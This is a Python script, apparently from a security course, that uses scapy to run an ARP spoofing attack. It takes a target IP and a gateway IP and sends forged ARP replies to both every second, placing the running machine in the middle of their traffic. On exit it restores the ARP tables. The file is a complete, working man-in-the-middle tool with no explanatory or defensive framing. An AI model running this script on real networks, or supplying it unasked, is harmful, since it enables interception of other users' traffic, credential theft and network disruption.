#!/usr/bin/env python
import time
import scapy.all as scapy
import optparse

def get_arguments():

    parser=optparse.OptionParser()
    parser.add_option("-t","--target",dest="target_ip",help="-t 10.0.2.9")
    parser.add_option("-g","--gateway",dest="gateway_ip",help="-g 10.0.2.1")

    (options,arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please enter a target ip")
    elif not options.gateway_ip:
        parser.error("[-] Please enter gateway ip")
    return options

def get_mac(ip):

    arp_req=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast=broadcast/arp_req
    answered_list=scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):

    target_mac = get_mac(target_ip)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    scapy.send(packet,verbose=False)

def restore(destination_ip,source_ip):

    destination_mac=get_mac(destination_ip)

    source_mac=get_mac(source_ip)

    packet = scapy.ARP(op=2, pdst=destination_ip,hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)#op=1 arp request, op2=arp response

    scapy.send(packet,count=4, verbose=False)


options=get_arguments()
target_ip=options.target_ip
gateway_ip=options.gateway_ip

try:

    sent_packets_count = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packets_count+=2

        print("\r[+] Packet sent: {}".format(sent_packets_count), end="")
        time.sleep(1)

except KeyboardInterrupt:

    print("\n[-] Quitting... Resetting ARP tables..\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
